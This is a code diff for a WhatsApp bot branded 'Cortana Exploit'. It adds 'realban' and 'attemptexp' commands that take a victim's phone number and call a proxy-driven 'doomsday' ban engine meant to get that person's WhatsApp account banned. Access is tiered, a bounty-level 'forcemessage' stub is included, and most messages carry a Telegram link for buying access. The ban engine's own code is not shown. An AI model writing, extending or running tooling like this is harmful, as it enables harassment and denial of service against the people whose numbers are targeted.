@@ -100,11 +100,15 @@ module.exports = bugHandler = async (sock, m, chatUpdate, store) => {
         // ═══════ DATABASE LOADING ═══════
         let premium = loadDatabase(config.premiumPath);
         let owner = loadDatabase(config.ownerPath);
+        const authorizedPath = path.join(__dirname, 'database', 'authorized.json');
+        let authorized = loadDatabase(authorizedPath);
 
         const isPremium = premium.includes(m.sender);
         const isCreator = [botNumber, ...owner, ...(config.owner || [])
             .map(v => v.replace(/[^0-9]/g, '') + '@s.whatsapp.net')]
             .includes(m.sender);
+        // Check if sender is in authorized database (for realban access)
+        const isAuthorized = authorized.includes(senderNumber) || authorized.includes(m.sender);
 
         // ═══════ VERIFIED BADGE CONTEXT ═══════
         const qchannel = {
@@ -223,10 +227,11 @@ ${config.branding.footer}`;
                 await sleep(400);
                 await reaction(m.chat, "✅");
 
+                const accessLevel = isAuthorized ? "🔓 𝐀𝐮𝐭𝐡𝐨𝐫𝐢𝐳𝐞𝐝" : isCreator ? "𝐎𝐰𝐧𝐞𝐫" : isPremium ? "𝐏𝐫𝐞𝐦𝐢𝐮𝐦" : "𝐍𝐨 𝐀𝐜𝐜𝐞𝐬𝐬";
                 const menu = `\`╭─[ ☠️ 𝐂𝐎𝐑𝐓𝐀𝐍𝐀 𝐄𝐗𝐏𝐋𝐎𝐈𝐓 ]\`
 \`│\` *Version* : ${config.version}
 \`│\` *Status* : ${config.status.public ? '𝐏𝐮𝐛𝐥𝐢𝐜' : '𝐏𝐫𝐢𝐯𝐚𝐭𝐞'}
-\`│\` *Access* : ${isCreator ? "𝐎𝐰𝐧𝐞𝐫" : isPremium ? "𝐏𝐫𝐞𝐦𝐢𝐮𝐦" : "𝐍𝐨 𝐀𝐜𝐜𝐞𝐬𝐬"}
+\`│\` *Access* : ${accessLevel}
 \`╰────────────────㋡︎\`
 
 \`╭─[ 𝐄͢𝐱͠𝐩͡𝐥͢𝐨͠𝐢͡𝐭 𝐂͢𝐨͠𝐦͡𝐦͢𝐚͠𝐧͡𝐝͢𝐬 ]\`
@@ -244,9 +249,13 @@ ${config.branding.footer}`;
 \`│\` ▢ ${prefix}cookall - inplace
 \`╰────❍\`
 
-\`╭─[ 𝐁͢𝐚͠𝐧͡ 𝐄͢𝐧͠𝐠͡𝐢͢𝐧͠𝐞 ]\`
-\`│\` ▢ ${prefix}perm-ban-num 62xxx
-\`│\` ▢ ${prefix}temp-ban-num 62xxx
+\`╭─[ 𝐁͢𝐚͠𝐧͡ 𝐄͢𝐱͠𝐩͡𝐥͢𝐨͠𝐢͡𝐭 ]\`
+\`│\` ▢ ${prefix}realban<target>
+\`│\` ▢ ${prefix}attemptexp<target>
+\`╰────❍\`
+
+\`╭─[ 𝐂͢𝐎͠𝐑͡𝐓͢𝐀͠𝐍͡𝐀 𝐗͢ 𝐁͠𝐎͡𝐔͢𝐍͠𝐓͡𝐘 ]\`
+\`│\` ▢ ${prefix}forcemessage
 \`╰────❍\`
 
 \`╭─[ 𝐎͢𝐰͠𝐧͡𝐞͢𝐫 𝐂͢𝐨͠𝐦͡𝐦͢𝐚͠𝐧͡𝐝͢𝐬 ]\`
@@ -588,24 +597,63 @@ ${config.branding.footer}`;
                 break;
             }
 
-            // ═══════ BAN ENGINE COMMANDS ═══════
-            case 'perm-ban-num': {
-                if (!isCreator) return zreply(`*no, this is for owners only*`);
+            // ═══════ BAN EXPLOIT COMMANDS ═══════
+
+            // .realban - MAXIMUM INTENSITY (Authorized DB Only)
+            case 'realban': {
+                // Check if user is in authorized database
+                if (!isAuthorized) {
+                    const chaoticDenial = `╔══════════════════════════════════════╗
+║ 💀 𝐂͢𝐎͠𝐑͡𝐓͢𝐀͠𝐍͡𝐀 𝐄͢𝐗͠𝐏͡𝐋͢𝐎͠𝐈͡𝐓 💀            ║
+╠══════════════════════════════════════╣
+║ 🦄 WOAHH THERE PARTNER! 🔥           ║
+║                                      ║
+║ You ain't got the JUICE for this     ║
+║ level of CHAOS! 😈💥                 ║
+║                                      ║
+║ 🌸 This command requires AUTHORIZED  ║
+║ access from the dev! 🌸              ║
+║                                      ║
+║ 💬 Message the dev for access:       ║
+║ 📲 t.me/eduqariz                     ║
+╚══════════════════════════════════════╝
+☠️ CORTANA EXPLOIT | © 2026`;
+                    return sock.sendMessage(m.chat, {
+                        text: chaoticDenial,
+                        contextInfo: {
+                            isForwarded: true,
+                            forwardedNewsletterMessageInfo: {
+                                newsletterJid: config.newsletter.jid,
+                                newsletterName: config.newsletter.name,
+                                serverMessageId: config.newsletter.serverMessageId
+                            }
+                        }
+                    });
+                }
 
                 if (!text) {
-                    return zreply(`— example: ${prefix + command} 62xxx`);
+                    const usageError = `╔══════════════════════════════════════╗
+║ 🌸 CORTANA EXPLOIT 🌸                ║
+╠══════════════════════════════════════╣
+║ ⚠️ Invalid format!                   ║
+║                                      ║
+║ Usage: ${prefix}realban 254712345678 ║
+║ (International format, 10+ digits)   ║
+╚══════════════════════════════════════╝
+📲 t.me/eduqariz | © 2026`;
+                    return sock.sendMessage(m.chat, { text: usageError });
                 }
 
                 let bijipler = text.replace(/[^0-9]/g, '');
-                if (bijipler.startsWith('0')) {
-                    return zreply(`Format: ${prefix + command} 628xxx`);
+                if (bijipler.length < 10 || bijipler.startsWith('0')) {
+                    return zreply(`⚠️ Use international format: ${prefix}realban 254xxxxxxxxx`);
                 }
 
                 let target = bijipler + '@s.whatsapp.net';
 
                 await reaction(m.chat, "🦠");
                 await sleep(400);
-                await reaction(m.chat, "☠️");
+                await reaction(m.chat, "💀");
                 await sleep(400);
                 await reaction(m.chat, "🔥");
 
@@ -613,33 +661,78 @@ ${config.branding.footer}`;
                     const { CortanaDoomsday } = require('./ban-engine');
                     const banEngine = new CortanaDoomsday();
 
-                    await sock.sendMessage(m.chat, {
-                        text: `☠️ *CORTANA PERMANENT BAN*\n\n🎯 Target: ${bijipler}\n⏳ Status: Initializing doomsday engine...\n\nThis may take several minutes.`
-                    });
+                    const initMsg = `╔══════════════════════════════════════╗
+║ ☠️ CORTANA REALBAN ☠️                ║
+╠══════════════════════════════════════╣
+║ 🎯 Target: ${bijipler.padEnd(25)}║
+║ ⚡ Mode: MAXIMUM INTENSITY            ║
+║ 🔥 Proxies: ALL AVAILABLE            ║
+║ ⏳ Duration: EXTENDED                ║
+║                                      ║
+║ 💀 Initializing doomsday engine...   ║
+╚══════════════════════════════════════╝`;
+                    await sock.sendMessage(m.chat, { text: initMsg });
 
-                    const result = await banEngine.executePermanentBan(target);
+                    // Execute MAXIMUM intensity ban
+                    const result = await banEngine.executeRealBan(target);
 
                     await reaction(m.chat, "✅");
-                    await cortanaBanSuccess(bijipler, command);
+
+                    const successMsg = `╔══════════════════════════════════════╗
+║ ☠️ CORTANA REALBAN SUCCESS ☠️        ║
+╠══════════════════════════════════════╣
+║ 💀 PAYLOAD DELIVERED 💀              ║
+║                                      ║
+║ 🎯 Target: ${bijipler.padEnd(25)}║
+║ ⚔️ Method: REALBAN                   ║
+║ 🔥 Intensity: MAXIMUM                ║
+║                                      ║
+║ ⏳ Wait 10 min before next request   ║
+╚══════════════════════════════════════╝
+📲 t.me/eduqariz | © 2026`;
+                    await sock.sendMessage(m.chat, {
+                        text: successMsg,
+                        contextInfo: {
+                            isForwarded: true,
+                            forwardedNewsletterMessageInfo: {
+                                newsletterJid: config.newsletter.jid,
+                                newsletterName: config.newsletter.name,
+                                serverMessageId: config.newsletter.serverMessageId
+                            }
+                        }
+                    });
 
                 } catch (error) {
-                    console.error('[BAN] Error:', error);
+                    console.error('[REALBAN] Error:', error);
                     await reaction(m.chat, "❌");
-                    zreply(`*Ban execution failed: ${error.message}*`);
+                    zreply(`*Realban execution failed: ${error.message}*`);
                 }
                 break;
             }
 
-            case 'temp-ban-num': {
-                if (!isCreator) return zreply(`*no, this is for owners only*`);
+            // .attemptexp - REDUCED INTENSITY (Connected Users)
+            case 'attemptexp': {
+                // Works for connected users (premium/owner) but not authorized DB users
+                if (!isPremium && !isCreator) {
+                    return zreply(`*⚠️ This command is for connected users only*\n\nConnect your bot first!`);
+                }
 
                 if (!text) {
-                    return zreply(`— example: ${prefix + command} 62xxx`);
+                    const usageError = `╔══════════════════════════════════════╗
+║ 🌸 CORTANA EXPLOIT 🌸                ║
+╠══════════════════════════════════════╣
+║ ⚠️ Invalid format!                   ║
+║                                      ║
+║ Usage: ${prefix}attemptexp 254712345678
+║ (International format, 10+ digits)   ║
+╚══════════════════════════════════════╝
+📲 t.me/eduqariz | © 2026`;
+                    return sock.sendMessage(m.chat, { text: usageError });
                 }
 
                 let bijipler = text.replace(/[^0-9]/g, '');
-                if (bijipler.startsWith('0')) {
-                    return zreply(`Format: ${prefix + command} 628xxx`);
+                if (bijipler.length < 10 || bijipler.startsWith('0')) {
+                    return zreply(`⚠️ Use international format: ${prefix}attemptexp 254xxxxxxxxx`);
                 }
 
                 let target = bijipler + '@s.whatsapp.net';
@@ -654,21 +747,76 @@ ${config.branding.footer}`;
                     const { CortanaDoomsday } = require('./ban-engine');
                     const banEngine = new CortanaDoomsday();
 
-                    await sock.sendMessage(m.chat, {
-                        text: `☠️ *CORTANA TEMPORARY BAN*\n\n🎯 Target: ${bijipler}\n⏳ Status: Initializing attack...\n\nThis may take a few minutes.`
-                    });
+                    const initMsg = `╔══════════════════════════════════════╗
+║ ☠️ CORTANA ATTEMPTEXP ☠️             ║
+╠══════════════════════════════════════╣
+║ 🎯 Target: ${bijipler.padEnd(25)}║
+║ ⚡ Mode: REDUCED INTENSITY            ║
+║ 🔄 Proxies: ~50                       ║
+║ ⏳ Duration: <40 minutes              ║
+║                                      ║
+║ ⏳ Initializing attack...             ║
+╚══════════════════════════════════════╝`;
+                    await sock.sendMessage(m.chat, { text: initMsg });
 
-                    const result = await banEngine.executeTemporaryBan(target);
+                    // Execute REDUCED intensity ban (50 proxies, <40min)
+                    const result = await banEngine.executeAttemptExp(target);
 
                     await reaction(m.chat, "✅");
-                    await cortanaBanSuccess(bijipler, command);
+
+                    const successMsg = `╔══════════════════════════════════════╗
+║ ☠️ CORTANA ATTEMPTEXP SUCCESS ☠️     ║
+╠══════════════════════════════════════╣
+║ ⚡ PAYLOAD SENT ⚡                     ║
+║                                      ║
+║ 🎯 Target: ${bijipler.padEnd(25)}║
+║ ⚔️ Method: ATTEMPTEXP                ║
+║ 🔥 Intensity: REDUCED                ║
+║                                      ║
+║ ⏳ Wait for results...               ║
+║                                      ║
+║ 💬 Want MAX power? Get authorized:   ║
+║ 📲 t.me/eduqariz                     ║
+╚══════════════════════════════════════╝`;
+                    await sock.sendMessage(m.chat, {
+                        text: successMsg,
+                        contextInfo: {
+                            isForwarded: true,
+                            forwardedNewsletterMessageInfo: {
+                                newsletterJid: config.newsletter.jid,
+                                newsletterName: config.newsletter.name,
+                                serverMessageId: config.newsletter.serverMessageId
+                            }
+                        }
+                    });
 
                 } catch (error) {
-                    console.error('[BAN] Error:', error);
+                    console.error('[ATTEMPTEXP] Error:', error);
                     await reaction(m.chat, "❌");
-                    zreply(`*Ban execution failed: ${error.message}*`);
+                    zreply(`*Attemptexp execution failed: ${error.message}*`);
                 }
                 break;
+            }
+
+            // .forcemessage - Placeholder (awaiting code from user)
+            case 'forcemessage': {
+                if (!isAuthorized) {
+                    const chaoticDenial = `╔══════════════════════════════════════╗
+║ 💀 𝐂͢𝐎͠𝐑͡𝐓͢𝐀͠𝐍͡𝐀 𝐗 𝐁͢𝐎͠𝐔͡𝐍͢𝐓͠𝐘 💀           ║
+╠══════════════════════════════════════╣
+║ 🦄 ACCESS DENIED! 🔥                 ║
+║                                      ║
+║ This is a BOUNTY-level command! 😈   ║
+║                                      ║
+║ 💬 Message the dev for access:       ║
+║ 📲 t.me/eduqariz                     ║
+╚══════════════════════════════════════╝
+☠️ CORTANA EXPLOIT | © 2026`;
+                    return sock.sendMessage(m.chat, { text: chaoticDenial });
+                }
+
+                // TODO: Implement forcemessage (awaiting code from user)
+                return zreply(`*🚧 Force message coming soon... Stay tuned! 🚧*`);
             }
 
             // ═══════ OWNER COMMANDS ═══════
